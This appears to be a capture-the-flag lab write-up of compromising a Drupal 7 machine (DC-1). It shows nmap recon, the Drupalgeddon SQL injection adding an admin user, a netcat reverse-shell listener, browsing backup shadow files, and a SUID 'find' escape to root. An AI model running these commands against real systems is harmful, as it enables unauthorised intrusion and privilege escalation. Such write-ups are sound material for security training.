## Recon

```
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE REASON         VERSION
22/tcp  open  ssh     syn-ack ttl 61 OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
| ssh-hostkey: 
|   1024 c4d659e6774c227a961660678b42488f (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAI1NiSeZ5dkSttUT5BvkRgdQ0Ll7uF//UJCPnySOrC1vg62DWq/Dn1ktunFd09FT5Nm/ZP9BHlaW5hftzUdtYUQRKfazWfs6g5glPJQSVUqnlNwVUBA46qS65p4hXHkkl5QO0OHzs8dovwe3e+doYiHTRZ9nnlNGbkrg7yRFQLKPAAAAFQC5qj0MICUmhO3Gj+VCqf3aHsiRdQAAAIAoVp13EkVwBtQQJnS5mY4vPR5A9kK3DqAQmj4XP1GAn16r9rSLUFffz/ONrDWflFrmoPbxzRhpgNpHx9hZpyobSyOkEU3b/hnE/hdq3dygHLZ3adaFIdNVG4U8P9ZHuVUk0vHvsu2qYt5MJs0k1A+pXKFc9n06/DEU0rnNo+mMKwAAAIA/Y//BwzC2IlByd7g7eQiXgZC2pGE4RgO1pQCNo9IM4ZkV1MxH3/WVCdi27fjAbLQ+32cGIzjsgFhzFoJ+vfSYZTI+avqU0N86qT+mDCGCSeyAbOoNq52WtzWId1mqDoOzu7qG52HarRmxQlvbmtifYYTZCJWJcYla2GAsqUGFHw==
|   2048 1182fe534edc5b327f446482757dd0a0 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCbDC/6BDEUIa7NP87jp5dQh/rJpDQz5JBGpFRHXa+jb5aEd/SgvWKIlMjUDoeIMjdzmsNhwCRYAoY7Qq2OrrRh2kIvQipyohWB8nImetQe52QG6+LHDKXiiEFJRHg9AtsgE2Mt9RAg2RvSlXfGbWXgobiKw3RqpFtk/gK66C0SJE4MkKZcQNNQeC5dzYtVQqfNh9uUb1FjQpvpEkOnCmiTqFxlqzHp/T1AKZ4RKED/ShumJcQknNe/WOD1ypeDeR+BUixiIoq+fR+grQB9GC3TcpWYI0IrC5ESe3mSyeHmR8yYTVIgbIN5RgEiOggWpeIPXgajILPkHThWdXf70fiv
|   256 3daa985c87afea84b823688db9055fd8 (ECDSA)
|_ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKUNN60T4EOFHGiGdFU1ljvBlREaVWgZvgWlkhSKutr8l75VBlGbgTaFBcTzWrPdRItKooYsejeC80l5nEnKkNU=
80/tcp  open  http    syn-ack ttl 61 Apache httpd 2.2.22 ((Debian))
|_http-server-header: Apache/2.2.22 (Debian)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Welcome to Drupal Site | Drupal Site
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries 
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
| /LICENSE.txt /MAINTAINERS.txt /update.php /UPGRADE.txt /xmlrpc.php 
| /admin/ /comment/reply/ /filter/tips/ /node/add/ /search/ 
| /user/register/ /user/password/ /user/login/ /user/logout/ /?q=admin/ 
| /?q=comment/reply/ /?q=filter/tips/ /?q=node/add/ /?q=search/ 
|_/?q=user/password/ /?q=user/register/ /?q=user/login/ /?q=user/logout/
|_http-favicon: Unknown favicon MD5: B6341DFC213100C61DB4FB8775878CEC
111/tcp open  rpcbind syn-ack ttl 61 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          46232/tcp   status
|   100024  1          48086/tcp6  status
|   100024  1          53990/udp   status
|_  100024  1          57904/udp6  status
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=11/9%OT=22%CT=1%CU=37370%PV=Y%DS=4%DC=T%G=Y%TM=654CF3D
OS:8%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=104%TI=Z%TS=8)SEQ(SP=107%GC
OS:D=1%ISR=104%TI=Z%II=I%TS=8)OPS(O1=M54EST11NW4%O2=M54EST11NW4%O3=M54ENNT1
OS:1NW4%O4=M54EST11NW4%O5=M54EST11NW4%O6=M54EST11)WIN(W1=3890%W2=3890%W3=38
OS:90%W4=3890%W5=3890%W6=3890)ECN(R=Y%DF=Y%T=40%W=3908%O=M54ENNSNW4%CC=Y%Q=
OS:)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y
OS:%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=16
OS:4%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=5FA9%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 0.486 days (since Thu Nov  9 03:19:18 2023)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT       ADDRESS
1   237.09 ms 192.168.45.1
2   189.68 ms 192.168.45.254
3   179.51 ms 192.168.251.1
4   173.87 ms 192.168.204.193
```
On port 80, a drupal website. in robots, i have many things
So for the drupal version i found 7.
```
└─# searchsploit Drupal 7.0
--------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                     |  Path
--------------------------------------------------------------------------------------------------- ---------------------------------
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Add Admin User)                                  | php/webapps/34992.py
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Admin Session)                                   | php/webapps/44355.php
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (1)                        | php/webapps/34984.py
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (2)                        | php/webapps/34993.php
Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Remote Code Execution)                           | php/webapps/35150.php
```
I exploited the first sql to add admin user.
```
[!] VULNERABLE!

[!] Administrator user created!

[*] Login: blo
[*] Pass: blo
[*] Url: http://192.168.204.193/?q=node&destination=node
```
Now i am connected as admin, i will try to get a shell on it
## Shell 
https://www.hackingarticles.in/drupal-reverseshell/
https://www.sevenlayers.com/index.php/blog/413-drupal-to-reverse-shell

```
└─# sudo rlwrap nc -lnvp 1337               
listening on [any] 1337 ...
connect to [192.168.45.244] from (UNKNOWN) [192.168.204.193] 37794
SOCKET: Shell has connected! PID: 4302
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
whoami
www-data
```
## Escalation
```
cd ..
www-data@DC-1:/var$ ls
ls
backups  cache	lib  local  lock  log  mail  opt  run  spool  tmp  www
www-data@DC-1:/var$ cd backups
cd backups
www-data@DC-1:/var/backups$ ls
ls
apt.extended_states.0  dpkg.status.0  gshadow.bak  shadow.bak
aptitude.pkgstates.0   group.bak      passwd.bak
www-data@DC-1:/var/backups$ 
flag4:x:1001:1001:Flag4,,,:/home/flag4:/bin/bash
local.txt 90e9b13739976d6d61d5ece232f2dfb6
```
## Root
```
www-data@DC-1:/home/flag4$ find / -type f -perm /4000 -ls 2>/dev/null
find / -type f -perm /4000 -ls 2>/dev/null
  4108   88 -rwsr-xr-x   1 root     root        88744 Dec 10  2012 /bin/mount
  7383   32 -rwsr-xr-x   1 root     root        31104 Apr 13  2011 /bin/ping
  3290   36 -rwsr-xr-x   1 root     root        35200 Feb 27  2017 /bin/su
  7385   36 -rwsr-xr-x   1 root     root        35252 Apr 13  2011 /bin/ping6
  4110   68 -rwsr-xr-x   1 root     root        67704 Dec 10  2012 /bin/umount
 30578   52 -rwsr-sr-x   1 daemon   daemon      50652 Oct  4  2014 /usr/bin/at
  5033   36 -rwsr-xr-x   1 root     root        35892 Feb 27  2017 /usr/bin/chsh
  5036   48 -rwsr-xr-x   1 root     root        45396 Feb 27  2017 /usr/bin/passwd
  3300   32 -rwsr-xr-x   1 root     root        30880 Feb 27  2017 /usr/bin/newgrp
  5032   44 -rwsr-xr-x   1 root     root        44564 Feb 27  2017 /usr/bin/chfn
  5035   68 -rwsr-xr-x   1 root     root        66196 Feb 27  2017 /usr/bin/gpasswd
 31155   84 -rwsr-sr-x   1 root     mail        83912 Nov 18  2017 /usr/bin/procmail
  2091  160 -rwsr-xr-x   1 root     root       162424 Jan  6  2012 /usr/bin/find
 30731  916 -rwsr-xr-x   1 root     root       937564 Feb 11  2018 /usr/sbin/exim4
  2577   12 -rwsr-xr-x   1 root     root         9660 Jun 20  2017 /usr/lib/pt_chown
144330  244 -rwsr-xr-x   1 root     root       248036 Jan 27  2018 /usr/lib/openssh/ssh-keysign
  7139    8 -rwsr-xr-x   1 root     root         5412 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
145809  316 -rwsr-xr--   1 root     messagebus   321692 Feb 10  2015 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
 31105   84 -rwsr-xr-x   1 root     root        84532 May 22  2013 /sbin/mount.nfs
www-data@DC-1:/home/flag4$ 

```
I found the `find` on SUID. i will use gtfobins.
```
sudo install -m =xs $(which find) .

./find . -exec /bin/bash -p \; -quit
```
```
www-data@DC-1:/home/flag4$ /usr/bin/find . -exec /bin/bash -p \; -quit
/usr/bin/find . -exec /bin/bash -p \; -quit
bash-4.2# id
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
bash-4.2# whoami
whoami
root
bash-4.2# 
bash-4.2# cat proof.txt
cat proof.txt
f6a058f66de011787ad5b7f8fee7235f
bash-4.2# 



```